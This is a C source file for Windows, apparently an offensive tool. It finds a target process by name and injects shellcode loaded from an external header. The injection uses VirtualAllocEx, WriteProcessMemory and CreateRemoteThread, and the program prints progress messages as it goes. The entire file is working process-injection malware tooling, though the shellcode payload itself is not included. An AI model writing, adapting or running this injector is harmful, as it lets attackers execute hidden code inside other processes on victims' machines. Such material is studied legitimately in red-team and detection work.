#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <tlhelp32.h>
#include "shellcode.h"
int findPID(const char* processName) {
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;
    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) 
    { 
        return 0; 
    }
    cProcesses = cbNeeded / sizeof(DWORD);

    for (i = 0; i < cProcesses; i++) {
        if (aProcesses[i] != 0) {

            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);

            if (hProcess != NULL) {
                HMODULE hMod;
                DWORD cbNeeded;
                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                    char szProcessName[MAX_PATH];
                    if (GetModuleBaseNameA(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(char))) {
                        if (strcmp(szProcessName, processName) == 0) {
                            return aProcesses[i];
                        }
                    }
                }
            }
        }
	}
	return 0;

}

int main(char argc, char *argv[]) {

    if (argc < 2) {
        printf("Usage: %s <process name>\n", argv[0]);
        getchar();
        return 1;
    }

    /*
    unsigned char shellcode[] is defined externally via `shellcode.c`
    */
    HANDLE processHandle;
    HANDLE remoteThread;

    void* exec_mem;
    int PID = 0;

    PID = findPID(argv[1]);
    printf("[*] Searching for %s...\n", argv[1]);

    if (PID == NULL) {
		printf("%s not running", argv[1]);
		return 1;
	}
    printf("[*] PID: %i\n", PID);

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, PID);
    exec_mem = VirtualAllocEx(processHandle, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
    printf("[*] Injecting into PID: %i\n", PID);
    WriteProcessMemory(processHandle, exec_mem, shellcode, sizeof(shellcode), NULL);
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, exec_mem, NULL, 0, NULL);
    printf("[*] Executing shellcode...\n");
    WaitForSingleObject(remoteThread, INFINITE);
    CloseHandle(processHandle);
    CloseHandle(remoteThread);
    getchar();
    return 0;
}
